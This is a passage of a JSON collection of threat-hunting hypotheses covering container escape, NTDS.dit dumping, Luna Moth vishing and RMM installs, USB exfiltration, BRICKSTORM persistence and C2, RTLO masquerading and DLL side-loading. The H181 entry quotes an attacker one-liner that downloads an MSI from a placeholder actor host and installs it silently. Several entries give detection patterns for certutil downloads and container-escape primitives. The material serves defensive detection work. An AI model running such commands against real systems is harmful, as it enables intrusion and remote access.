`/sys/fs/cgroup/`, `/proc/self/exe`, `/sys/module/`, host `/etc/cron.d` and `/root/.ssh` writes from container contexts. Cross-reference **T1610** (Deploy Container — the privileged container the docker.sock path creates), **T1611** parent escape, and **T1059.004** (Unix Shell — the reverse shell `call_usermodehelper()` spawns). Pair with a baseline of which workloads legitimately mount `docker.sock` (CI runners, monitoring agents) to suppress noise.",
    "tags": [
      "privilege_escalation",
      "linux",
      "containers",
      "container_escape",
      "kubernetes",
      "docker_socket",
      "cgroup",
      "kernel_module",
      "T1611"
    ],
    "techniques": [
      "T1611"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Container escape is the moment a contained compromise becomes a host (and often cluster) compromise, so the escape primitives are exactly where detection effort pays off most. Each documented path — `release_agent` write, `insmod` from a container, host `mount()`, docker.sock API abuse — is individually rare and high-signal on a properly segmented host, so hunting the union of them gives broad coverage of \"container broke out\" without depending on any single CVE\n- These behaviors are structurally anomalous regardless of the specific exploit: a write to a cgroup `release_agent`, a kernel module load originating in a container namespace, or a `mount()` of a host device from inside a container are things legitimate containerized workloads essentially never do. That makes the hunt durable against new CVEs in the same class (runc, cgroups, kernel) — the exploit changes but the escape action it produces stays observable\n- The docker.sock path is the most common real-world escape and the easiest to baseline: only a known, small set of workloads (CI/CD runners, image builders, monitoring agents) legitimately mount `/var/run/docker.sock`. Once that allowlist exists, any *other* container with the socket — or any container issuing a `containers/create` with `\"Privileged\":true` — is an immediate flag, and the Kubernetes audit log gives the same signal for `privileged`/`hostPath` Pod specs\n- Container hosts are often the least-instrumented part of the estate even though they run the most sensitive workloads (CI, secrets, customer data planes). Standing up Falco/eBPF runtime rules plus auditd syscall watches for these escape primitives — and correlating with Kubernetes audit events — closes a gap that supply-chain and cloud actors increasingly target as the path from a poisoned image to full node control",
    "references": "- [MITRE ATT&CK T1611 - Escape to Host](https://attack.mitre.org/techniques/T1611/)\n- [MITRE ATT&CK T1610 - Deploy Container](https://attack.mitre.org/techniques/T1610/)\n- [Securelist (Kaspersky) - Containers on fire: from container escapes to supply chain attacks](https://securelist.com/container-attack-vectors/120010/)\n- [Falco - Detecting container escapes and privileged container launches (default ruleset)](https://github.com/falcosecurity/rules/blob/main/rules/falco_rules.yaml)\n- [Unit 42 (Palo Alto) - CVE-2022-0492: cgroups release_agent container escape analysis](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)\n- [Sysdig - Detecting and mitigating CVE-2024-21626 runC container escape](https://www.sysdig.com/blog/cve-2024-21626-runc-escape)\n- [MITRE - Kubernetes audit logging for privileged Pod creation detection](https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/)",
    "file_path": "Flames/H179.md"
  },
  {
    "id": "H180",
    "category": "Flames",
    "title": "Adversaries are using the print command to copy the Active Directory database (NTDS.dit) and SAM and SYSTEM registry hives from Volume Shadow Copy snapshots to temporary directories over SMB to extract domain credentials for lateral movement and privilege escalation.",
    "tactic": "Credential Access",
    "notes": "Based on ATT&CK technique T1003.003. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "credential_access",
      "ntds",
      "T1003.003",
      "T1003"
    ],
    "techniques": [
      "T1003.003",
      "T1003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "asteinbr",
      "link": ""
    },
    "why": "- The print command is a native Windows utility rarely used for legitimate file operations, making its abuse for credential dumping highly anomalous and indicative of sophisticated threat actor activity\n- Successful extraction of NTDS.dit provides attackers with every domain user's password hash, enabling complete domain compromise through pass-the-hash attacks or offline cracking\n- This technique was observed in the STAC4713 campaign linked to GOLD ENCOUNTER and PayoutsKing ransomware, representing an active threat to organizations with exposed attack surfaces\n- The use of print command over SMB to copy files from Volume Shadow Copies is a deliberate evasion technique that bypasses many traditional credential theft detections focused on more common tools like ntdsutil or vssadmin",
    "references": "- [MITRE ATT&CK T1003.003 - OS Credential Dumping: NTDS](https://attack.mitre.org/techniques/T1003/003/)\n- [Source CTI Report](https://www.sophos.com/en-us/blog/qemu-abused-to-evade-detection-and-enable-ransomware-delivery)",
    "file_path": "Flames/H180.md"
  },
  {
    "id": "H181",
    "category": "Flames",
    "title": "Adversaries (UNC3753 / Luna Moth) use the Windows command shell to curl-download an RMM MSI and install it with `msiexec /i ... /quiet` after a vishing-driven screen-share, establishing remote access without traditional malware.",
    "tactic": "Execution",
    "notes": "Platform: Windows. Source: Mandiant/GTIG UNC3753 (Luna Moth / Silent Ransom Group) campaign against US law firms (June 5, 2026). Behavior: an operator who has the target screen-sharing pastes a one-liner that pulls an RMM MSI with curl and installs it silently — e.g. `curl -sL hxxp://<actor-ip>/installer -o \"SuperOps.msi\" && msiexec /i \"SuperOps.msi\" /quiet`. Detection: correlate the curl→msiexec sequence on one host within ~5 min. Sysmon Event ID 1 / Security 4688 for `curl.exe` whose command line carries a URL plus `-o`/`.msi`, immediately followed by `msiexec.exe` with `/i` + `/quiet`; Sysmon Event ID 3 / `DeviceNetworkEvents` for the curl HTTP(S) fetch to an IP/domain not owned by the RMM vendor; Sysmon Event ID 11 for the dropped `*.msi` in `%USERPROFILE%\\Downloads` or `%TEMP%`. KQL: `DeviceProcessEvents | where FileName==\"curl.exe\" and ProcessCommandLine has_any(\".msi\",\"-o\")` joined to `DeviceProcessEvents | where FileName==\"msiexec.exe\" and ProcessCommandLine contains \"/quiet\"` on `DeviceId` within 5m. Flag MSI source hosts not owned by the named RMM vendors (SuperOps, AnyDesk, BeyondTrust/Bomgar, Zoho Assist). Mandiant published Google SecOps rule \"Execute MSI Files Downloaded via Curl\" covering this exact chain. Cross-ref T1219 (Remote Access Software), T1569.002 (service install via msiexec), T1566.004 (the vishing initial access — see [[H182]]); baseline normal RMM/remote-access with [[B021]].",
    "tags": [
      "execution",
      "rmm",
      "msiexec",
      "curl",
      "luna_moth",
      "windows",
      "T1219",
      "T1569.002",
      "T1566.004",
      "T1059.003"
    ],
    "techniques": [
      "T1219",
      "T1569.002",
      "T1566.004",
      "T1059.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The whole point of the curl→`msiexec /quiet` chain is that every component is a signed, legitimate utility — `curl.exe` ships in-box, `msiexec.exe` is a trusted installer, and the RMM payload is a commercially code-signed MSI — so no single artifact looks malicious; the *sequence and source* are the tell, which is exactly what makes a correlation hunt the right tool.\n- This actor deploys data-theft extortion with no ransomware and no custom implant, so endpoint AV has almost nothing to fire on. Catching the install chain is often the earliest host-based opportunity to interdict the intrusion before bulk collection and exfil begin.\n- The behavior is highly detectable because legitimate software deployment in a managed enterprise almost never looks like an interactive user shelling out to `curl` to pull an MSI from a bare IP and silently installing it — sanctioned RMM arrives via the deployment tooling, not an ad-hoc one-liner during a Teams/Zoom call.\n- Anchoring on the curl→msiexec pattern (rather than on specific RMM names) generalizes: the same delivery one-liner catches whichever RMM the operator rotates to next, and the MSI-source allowlist check survives infrastructure churn.",
    "references": "- [MITRE ATT&CK T1059.003 - Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)\n- [Mandiant / GTIG - Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms (source report)](https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/)\n- [Red Canary - Detecting RMM software and other remote admin tools](https://redcanary.com/blog/threat-detection/rmm-software/)\n- [Intel 471 - Understanding and threat hunting for RMM software misuse](https://www.intel471.com/blog/understanding-and-threat-hunting-for-rmm-software-misuse)\n- [Microsoft Security Blog - Signed malware impersonating workplace apps deploys RMM backdoors](https://www.microsoft.com/en-us/security/blog/2026/03/03/signed-malware-impersonating-workplace-apps-deploys-rmm-backdoors/)\n- [LOLBAS - Msiexec.exe (living-off-the-land install/execute)](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)\n- [BleepingComputer - FBI warns of Luna Moth extortion attacks targeting law firms](https://www.bleepingcomputer.com/news/security/fbi-warns-of-luna-moth-extortion-attacks-targeting-law-firms/)",
    "file_path": "Flames/H181.md"
  },
  {
    "id": "H182",
    "category": "Flames",
    "title": "Adversaries (UNC3753 / Luna Moth) use spearphishing voice (vishing) posing as IT help desk to drive victims into a screen-share, then install RMM tools; hunt RMM/remote-access binaries spawned by collaboration apps plus access to privnote and lookalike help-desk domains.",
    "tactic": "Initial Access",
    "notes": "Platform: Windows / M365. Source: Mandiant/GTIG UNC3753 (Luna Moth) vs US law firms (June 5, 2026). T1566.004 itself (the phone call) is not in telemetry, so hunt the observable downstream chain: (1) an RMM / remote-access binary — `anydesk.exe`, `bomgar*`/`beyondtrust`, `zoho*`/`ZA_*`, SuperOps, `winscp.exe`, `rclone.exe` — whose ParentImage is a screen-share/collab app (`Teams.exe`, `ms-teams.exe`, `Zoom.exe`, `quickassist.exe`, `msra.exe`/Terminal Services) via Sysmon Event ID 1 / Security 4688; (2) RMM binary running from a non-standard path (`%USERPROFILE%\\Downloads`, `%TEMP%`) rather than `%ProgramFiles%`; (3) proxy/`DeviceNetworkEvents` hits to `privnote.com` (self-destructing install links/commands) and to lookalike help-desk domains (`<org>-itdesk[.]com`, `<org>-it[.]com`, `<org>-helpdesk[.]com`) from a user workstation; (4) M365 sign-in / UAL showing Quick Assist or new RMM access shortly after a flurry of Teams calls to a single user (report noted 5 Teams calls over 3 days). Mandiant Sigma keys on RMM `Image",
    "tags": [
      "T1566.004",
      "T1219",
      "T1204.002",
      "T1059.003"
    ],
    "techniques": [
      "T1566.004",
      "T1219",
      "T1204.002",
      "T1059.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "#initial_access #T1566_004 #vishing #rmm #help_desk #luna_moth #windows",
      "link": ""
    },
    "why": "- Vishing is invisible to almost every control — there is no link, no attachment, no malicious payload in email — so the phone call itself can never be hunted; the durable detection surface is the *consequence* on the endpoint and in M365, where an RMM tool suddenly appears as a child of the app the attacker used to talk the victim through installing it.\n- Parent-child lineage is the discriminator that separates malicious from sanctioned RMM: legitimate help-desk software is pushed by deployment tooling and runs from Program Files, whereas a victim-installed tool during a fake support call is launched interactively from a browser/collab process and runs from Downloads or Temp.\n- The actor's supporting infrastructure leaves complementary, low-false-positive web telemetry — `privnote.com` to pass self-destructing commands and `<org>-helpdesk[.]`-style lookalike domains — so correlating the host install chain with these network artifacts raises confidence well above either signal alone.\n- This is the signature entry technique of a financially motivated cluster actively hitting law and professional-services firms; detecting the post-call install gives responders a window to cut access before the bulk document collection (see [[M018]]) and exfil that follow within hours.",
    "references": "- [MITRE ATT&CK T1566.004 - Phishing: Spearphishing Voice](https://attack.mitre.org/techniques/T1566/004/)\n- [Mandiant / GTIG - Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms (source report)](https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/)\n- [Unit 42 - Threat Assessment: Luna Moth Callback Phishing Campaign](https://unit42.paloaltonetworks.com/luna-moth-callback-phishing/)\n- [Red Canary - You're invited: Four phishing lures in campaigns dropping RMM tools](https://redcanary.com/blog/threat-intelligence/phishing-rmm-tools/)\n- [Intel 471 - Understanding and threat hunting for RMM software misuse](https://www.intel471.com/blog/understanding-and-threat-hunting-for-rmm-software-misuse)\n- [BleepingComputer - Luna Moth extortion hackers pose as IT help desks to breach US firms](https://www.bleepingcomputer.com/news/security/luna-moth-extortion-hackers-pose-as-it-help-desks-to-breach-us-firms/)\n- [Dark Reading - FBI: Silent Ransom Group vishing law firms](https://www.darkreading.com/endpoint-security/fbi-silent-ransom-group-vishing-law-firms)",
    "file_path": "Flames/H182.md"
  },
  {
    "id": "H183",
    "category": "Flames",
    "title": "Adversaries (UNC3753 / Luna Moth) impersonating on-site IT technicians exfiltrate data to USB storage; hunt removable-device attach (PnP) followed by a burst of file copies to the device, especially on hosts that rarely use removable media.",
    "tactic": "Exfiltration",
    "notes": "Platform: Windows. Source: Mandiant/GTIG UNC3753 (Luna Moth) vs US law firms (June 5, 2026) — *\"individuals posing as IT technicians entered corporate offices to attempt direct exfiltration of data from an endpoint using USB storage media.\"* Detection (enable first): turn on Audit PNP Activity and Audit Removable Storage (off by default). Then hunt: Security Event ID 6416 (new external device recognized — capture VID/PID/serial) correlated with a burst of Event ID 4663 where Task Category = *Removable Storage* and `Accesses` = `WriteData`/`AppendData` (copy to USB) or large-volume `ReadData` from sensitive shares immediately before; Sysmon Event ID 11 (FileCreate) to a removable drive letter; MDE `DeviceEvents` `PnpDeviceConnected` + `DeviceFileEvents` writes to a removable volume. Stack 6416 (device) → 4663 (files) → 4624 (logon/user) to attribute. Immediate-flag patterns: copies to a USB serial never before seen in the estate; file-copy bursts to removable media from a workstation with no historical removable-media use; document-heavy copies (iManage exports, `.pdf`/`.docx`/`.xlsx` containing W-2/W-9/1099/SSN names) to USB; activity outside business hours. Cross-ref T1005 (Data from Local System), T1083 (the discovery that precedes — see [[M018]]); pairs with the org's removable-media baseline.",
    "tags": [
      "exfiltration",
      "usb",
      "removable_media",
      "insider",
      "luna_moth",
      "windows",
      "T1005",
      "T1083",
      "T1052.001"
    ],
    "techniques": [
      "T1005",
      "T1083",
      "T1052.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Physical USB exfil bypasses every network-egress control — DLP proxies, CASB, firewall — because the data never crosses the wire; the only durable evidence lives in host PnP and file-access auditing, which is precisely why those (default-off) audit policies must be enabled and hunted.\n- An attacker physically present as a \"technician\" is a deliberate evolution past the actor's usual remote tooling, and it specifically targets the highest-value, least-monitored moment — a logged-in workstation with a human walking the operator through it — so a removable-media hunt closes a gap that RMM and cloud-exfil hunts cannot see.\n- The behavior is detectable because removable-media write bursts are rare and bursty on most corporate endpoints: stacking device-attach against file-write volume per host makes a wholesale copy stand out sharply from the occasional legitimate USB use, and unseen device serials add a high-signal anomaly.\n- USB serials, copy volume, and off-hours timing are environment-stable signals that survive the actor changing personas or tooling, making this hunt resilient and reusable as a standing insider/physical-exfil detection rather than a one-campaign rule.",
    "references": "- [MITRE ATT&CK T1052.001 - Exfiltration Over Physical Medium: Exfiltration over USB](https://attack.mitre.org/techniques/T1052/001/)\n- [Mandiant / GTIG - Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms (source report)](https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/)\n- [Microsoft Learn - Monitor the use of removable storage devices (Audit Removable Storage / 4663)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/monitor-the-use-of-removable-storage-devices)\n- [Netsurion - Tracking removable storage with the Windows Security Log](https://www.netsurion.com/articles/tracking-removable-storage-with-the-windows-security-log)\n- [ManageEngine - Event ID 6416: A new external device was recognized by the system](https://www.manageengine.com/products/active-directory-audit/process-tracking-events/event-id-6416.html)\n- [Insider Threat Matrix - DT099: Windows Event Log, Audit Removable Storage](https://insiderthreatmatrix.org/detections/DT099)\n- [Compass Security - Investigating data leakage via external storage devices](https://blog.compass-security.com/2019/04/investigating-data-leakage-via-external-storage-devices/)",
    "file_path": "Flames/H183.md"
  },
  {
    "id": "H184",
    "category": "Flames",
    "title": "Adversaries (VerdantBamboo) persist on edge/network appliances by adding/modifying cron entries (`/etc/crontab`, `/etc/cron.d/*`) to launch BRICKSTORM/AGENTPSD; hunt cron file creation/modification and cron-spawned execs from non-package binary paths on appliances.",
    "tactic": "Persistence",
    "notes": "Platform: Linux / BSD network & storage appliances. Source: Volexity \"VerdantBamboo: Just Another BRICKSTORM in the Firewall\" (June 4, 2026). Observed: `/etc/crontab` entry `20 14 15 * * root /usr/local/bin/egnyte/egnyte_host_monitor_client` (AGENTPSD, fires 15th of month 14:20); a manually created `/etc/cron.d/ssync` running `/home/egnyteservice/ssync.sh` then removed after execution; on the pfSense firewall a modified `/etc/rc.d/cron` to launch BRICKSTORM (`/usr/sbin/luserput`) at startup. Detection: file integrity / FIM and auditd watches on `/etc/crontab`, all `/etc/cron.*` (incl. `cron.d`), `/var/spool/cron/*`, and `/etc/rc.d/*` — alert on any create/modify (`auditd` `-w /etc/crontab -p wa`, etc.; note default FIM often only watches `/etc/crontab`, so add the rest). Hunt cron-spawned processes whose executable lives outside the appliance vendor package tree (e.g. `/usr/local/bin/egnyte/…`, `/usr/sbin/luserput`, `/home/<svc>/*.sh`); flag cron jobs created and deleted within a short window (anti-forensic churn). On platforms with osquery, diff the `crontab` table against a known-good appliance image. Cross-ref T1037.004 (RC Scripts — the `/etc/rc.d/cron` startup variant), T1548.003 (the misconfigured-sudo `tee`-as-root privesc that enabled the writes), and T1071.001 (BRICKSTORM C2 — see [[H185]]); appliance access baseline in [[B022]].",
    "tags": [
      "persistence",
      "cron",
      "brickstorm",
      "edge_appliance",
      "linux",
      "verdantbamboo",
      "T1037.004",
      "T1548.003",
      "T1071.001",
      "T1053.003"
    ],
    "techniques": [
      "T1037.004",
      "T1548.003",
      "T1071.001",
      "T1053.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Edge appliances are deliberately chosen for persistence because they lack EDR, so the attacker can hide for 18+ months — but they still run a standard Unix cron, which means cron file integrity and cron-spawned-process monitoring is one of the few high-signal detections actually available on these devices.\n- Cron persistence is detectable because a clean appliance's crontab and `cron.d` are near-static and vendor-defined: any new entry, any job pointing at a binary outside the package tree, or a job that appears and vanishes is a sharp deviation from a baseline that legitimate operation almost never produces.\n- Anchoring on cron/rc *modification* rather than on the specific BRICKSTORM/AGENTPSD hashes makes the hunt durable — the actor customizes and recompiles the backdoor per device and per C2 domain (Go, gobfuscate-obfuscated), so file hashes rotate while the persistence primitive (a cron line launching a non-package binary) stays constant.\n- The \"create then delete\" `/etc/cron.d/ssync` tradecraft is itself a tell: legitimate administration does not routinely add and immediately remove cron jobs, so flagging short-lived cron entries surfaces deliberately anti-forensic behavior that point-in-time inspection would miss.",
    "references": "- [MITRE ATT&CK T1053.003 - Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)\n- [Volexity - VerdantBamboo: Just Another BRICKSTORM in the Firewall (source report)](https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/)\n- [MITRE ATT&CK T1037.004 - Boot or Logon Initialization Scripts: RC Scripts](https://attack.mitre.org/techniques/T1037/004/)\n- [Elastic - detection-rules: persistence_via_cron (hunting query)](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_cron.toml)\n- [Elastic Security Labs - Linux Detection Engineering: a primer on persistence mechanisms](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)\n- [pberba - Hunting for Persistence in Linux (Part 3): Systemd, Timers, and Cron](https://pberba.github.io/security/2022/01/30/linux-threat-hunting-for-persistence-systemd-timers-cron/)\n- [Mandiant / Google Cloud - Another BRICKSTORM: Stealthy Backdoor Enabling Espionage into Tech and Legal Sectors](https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign)",
    "file_path": "Flames/H184.md"
  },
  {
    "id": "H185",
    "category": "Flames",
    "title": "Adversaries (VerdantBamboo) run BRICKSTORM on edge appliances using WebSocket-over-HTTPS C2 to Cloudflare-fronted domains plus DNS-over-HTTPS to 8.8.8.8; hunt outbound web/DoH traffic sourced from appliance management IPs, which should be near-zero.",
    "tactic": "Command and Control",
    "notes": "Platform: Linux / BSD network & storage appliances (network-side detection). Source: Volexity \"VerdantBamboo: Just Another BRICKSTORM in the Firewall\" (June 4, 2026). Observed: BRICKSTORM (Go, `wssoft.core`/`wssoft.libs`) connects via HTTPS then upgrades to a WebSocket (`wss://…/api`) with task extensions `command` (remote shell), `socks` (SOCKS5 proxy), `web` (filesystem server); C2 fronted by Cloudflare IPs; DNS-over-HTTPS via TLS to Google `8.8.8.8`; AGENTPSD fallback POSTs with header `sec-fetch-tag:1<base64 sysinfo>`. Detection: the core anomaly is *any* established outbound web/DoH session whose source is an appliance management IP (firewall, NAS, Storage Sync) — inventory those IPs and alert on outbound 443/WebSocket/DoH that is not a known vendor update/telemetry endpoint. From network/firewall + Zeek logs: WebSocket `Upgrade` to Cloudflare-hosted hosts from an appliance; TLS to `8.8.8.8`/`8.8.4.4` (DoH) from an appliance; HTTP POSTs bearing the `sec-fetch-tag:1<base64>` header. Censys/host fingerprint for the C2 (Golang zero-length HTTP response, Cloudflare issuer, OpenBSD SSH present, <=4 services): `host.service_count<=4 AND host.services:(banner_hash_sha256:\"e28a96f983b8605decd2ac1db16ebad5fa741a6aa4e585a38ade0e5ad7d6cec0\" AND port=443) AND host.services.cert.parsed.issuer.organization=\"CloudFlare, Inc.\" AND host.services:(port=22 AND software.vendor:openbsd)`. Run Mandiant's BRICKSTORM scanner / YARA `G_APT_Backdoor_BRICKSTORM_3` on *nix appliances. Cross-ref T1572 / T1090.001 (the SOCKS5 proxy task), T1071.004 (the DoH resolution), and the cron persistence in [[H184]]; appliance baseline [[B022]].",
    "tags": [
      "command_and_control",
      "brickstorm",
      "websocket",
      "doh",
      "edge_appliance",
      "verdantbamboo",
      "T1572",
      "T1090.001",
      "T1071.004",
      "T1071.001"
    ],
    "techniques": [
      "T1572",
      "T1090.001",
      "T1071.004",
      "T1071.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- An appliance's management interface has a tiny, predictable outbound profile — vendor updates and crash telemetry — so *any* established WebSocket-over-HTTPS or DoH session sourced from it is intrinsically anomalous; modeling \"appliance management IP talking to the internet\" turns a stealthy C2 channel into a high-signal, low-volume hunt.\n- BRICKSTORM deliberately blends into normal web traffic (HTTPS, nested TLS, WebSockets, Cloudflare fronting, DoH) precisely because appliances lack EDR and the operators expect host-based detection to be absent — which is exactly why the durable detection plane is the network egress from the appliance, not the appliance itself.\n- DNS-over-HTTPS from an appliance is a especially clean tell: legitimate appliances resolve via their configured resolvers, not by tunneling DNS inside TLS to 8.8.8.8, so flagging appliance-sourced DoH catches the C2 resolution step even when the WebSocket payload is fully encrypted.\n- Anchoring on the channel's structure (appliance-sourced web/WebSocket/DoH to non-vendor, Cloudflare-fronted infrastructure) rather than on specific domains or hashes makes the hunt resilient to the per-target customization and C2-domain rotation that define this actor, and it generalizes to other edge-device implants that adopt the same blend-in tradecraft.",
    "references": "- [MITRE ATT&CK T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)\n- [Volexity - VerdantBamboo: Just Another BRICKSTORM in the Firewall (source report)](https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/)\n- [Mandiant / Google Cloud - Another BRICKSTORM: Stealthy Backdoor Enabling Espionage into Tech and Legal Sectors](https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign)\n- [CISA - BRICKSTORM Backdoor analysis report (AR25-338A)](https://www.cisa.gov/news-events/analysis-reports/ar25-338a)\n- [MITRE ATT&CK T1071.004 - Application Layer Protocol: DNS (DNS-over-HTTPS context)](https://attack.mitre.org/techniques/T1071/004/)\n- [CISA - Guidance and strategies to protect network edge devices](https://www.cisa.gov/resources-tools/resources/guidance-and-strategies-protect-network-edge-devices)\n- [NVISO Labs - BRICKSTORM backdoor analysis report](https://blog.nviso.eu/wp-content/uploads/2025/04/NVISO-BRICKSTORM-Report.pdf)",
    "file_path": "Flames/H185.md"
  },
  {
    "id": "H186",
    "category": "Flames",
    "title": "An adversary delivers a malicious executable whose filename embeds the right-to-left override character (U+202E) so it renders as a PDF, tricking the user into running it; the file lands in a user-writable path (Downloads/Temp/extracted RAR) and is the parent of follow-on staging activity.",
    "tactic": "Defense Evasion",
    "notes": "Hunt at the byte level, never on rendered names. Sysmon EID 11 (FileCreate) and EID 1 / Security 4688 (ProcessCreate): match `TargetFilename`/`Image`/`CommandLine` against the raw U+202E (‮) char and its encodings `[U+202E]`, `%E2%80%AE`, `\\xE2\\x80\\xAE`. Defender KQL: `DeviceFileEvents | where FileName has_any(\"‮\") ` and `DeviceProcessEvents | where ProcessCommandLine matches regex @\"‮\"`. Reversed-extension regex catches the classic flip: filename contains one of `rcs.`,`fdp.`,`cod.`,`xlsx.`,`gpj.`,`exe.` mid-string. Pivot: any hit whose child process is `certutil.exe` with `-urlcache`/`-split`/`-f`, or that drops to `C:\\Users\\Public\\Documents\\` or `C:\\Users\\Public\\Downloads\\` (observed payload.exe / stub.exe staging), is high-confidence. Note legacy email gateways miss RTLO; EDR file-write events do not. Pairs with domain-trust-discovery baseline hunt [[B023]] for the same intrusion's discovery phase.",
    "tags": [
      "defense_evasion",
      "masquerading",
      "rtlo",
      "u202e",
      "phishing",
      "certutil",
      "T1036.002"
    ],
    "techniques": [
      "T1036.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The Deception.Pro op report documents an SSA-themed phish whose dropper used an RTLO-masked filename (`...№_<U+202E>fdp.exe` posing as a PDF) as the entry point to a multi-RAT (AdaptixC2 + XWorm + ScreenConnect) intrusion — a current, real-world TTP.\n- RTLO is invisible to humans and to many email gateways but is fully recoverable at the byte level from Sysmon/EDR file-write and process-create telemetry, so the hunt has near-zero false-negative cost when scoped to U+202E.\n- The technique is rare in benign traffic (Red Canary reports ~300 true hits per 90 days across a large enterprise fleet), giving an excellent signal-to-noise ratio for a targeted query.\n- Chaining the RTLO hit to its `certutil` staging child and the observed `C:\\Users\\Public\\...` drop paths converts a single masquerade indicator into a full execution-to-staging detection.",
    "references": "- [MITRE ATT&CK T1036.002 - Masquerading: Right-to-Left Override](https://attack.mitre.org/techniques/T1036/002/)\n- [[Op Report] From SSA Phish to AdaptixC2: A Multi-RAT Intrusion - Deception.Pro](https://blog.deception.pro/blog/xworm-sc-hok-may-2026)\n- [Splunk - Detect RTLO In File Name](https://research.splunk.com/endpoint/468b7e11-d362-43b8-b6ec-7a2d3b246678/)\n- [Sigma - Potential File Extension Spoofing Using Right-to-Left Override (Detection.FYI)](https://detection.fyi/sigmahq/sigma/windows/file/file_event/file_event_win_susp_right_to_left_override_extension_spoofing/)\n- [Sigma - Potential Defense Evasion Via Right-to-Left Override (Detection.FYI)](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_susp_right_to_left_override/)\n- [Red Canary - Right-to-Left Override: Detecting Attacks With EDR Data](https://redcanary.com/blog/threat-detection/right-to-left-override/)\n- [CISA Eviction Strategies - Right-to-Left Override (T1036.002)](https://www.cisa.gov/eviction-strategies-tool/info-attack/T1036.002)\n- [Atomic Red Team - T1036 RTLO file extension spoofing tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036/T1036.md)",
    "file_path": "Flames/H186.md"
  },
  {
    "id": "H187",
    "category": "Flames",
    "title": "A legitimately code-signed executable has been renamed and is side-loading an unsigned/invalid-signature DLL from a user-writable, non-standard path (OceanLotus signed-binary DLL side-loading).",
    "tactic": "Defense Evasion",
    "notes": "Windows. Sysmon EID 1 (ProcessCreate): flag `Signed=true` + `SignatureStatus=Valid` images whose `OriginalFileName` (PE metadata) != `Image` filename, OR known signers (e.g. legitimate Toolbox/dtlupdate publishers) running under masquerade names (Genuine.exe, Updater.exe, AutoCAD242.exe, IntelAudioService.exe), OR any command line containing `-uiDll`. Sysmon EID 7 (ImageLoad): correlate same PID loading a DLL where `Signed=false` OR `SignatureStatus` != Valid AND `ImageLoaded` path is outside `C:\\Windows\\` and `C:\\Program Files*` (e.g. `%TEMP%`, `%APPDATA%`, `%PUBLIC%`, ProgramData subdirs). Security EID 4688 fallback for command-line `-uiDll`. Pivot: process runs from a directory it does not normally ship in. Tune by allowlisting signer+OriginalFileName pairs seen in your golden image.",
    "tags": [
      "defense_evasion",
      "dll_side_loading",
      "oceanlotus",
      "apt32",
      "spectralviper",
      "windows",
      "sysmon",
      "T1553.002",
      "T1574.002"
    ],
    "techniques": [
      "T1553.002",
      "T1574.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- ESET's report shows OceanLotus uses the trust of valid Authenticode signatures on `Toolbox.exe` and `dtlupdate.exe` to launch SPECTRALVIPER — the signature is real, so allow-by-signature controls pass while malicious code runs.\n- The `-uiDll` parameter is the side-loading trigger and is an unusually specific, high-signal artifact to pivot on in command lines.\n- Renaming a signed binary breaks the link between its PE `OriginalFileName` and its on-disk name — a cheap, reliable anomaly to compute from Sysmon EID 1.\n- Pairing a valid-signed parent with an *unsigned* child DLL loaded from a user-writable path (Sysmon EID 7) is the core defeat of code-signing trust and rarely occurs benignly outside standard install paths.",
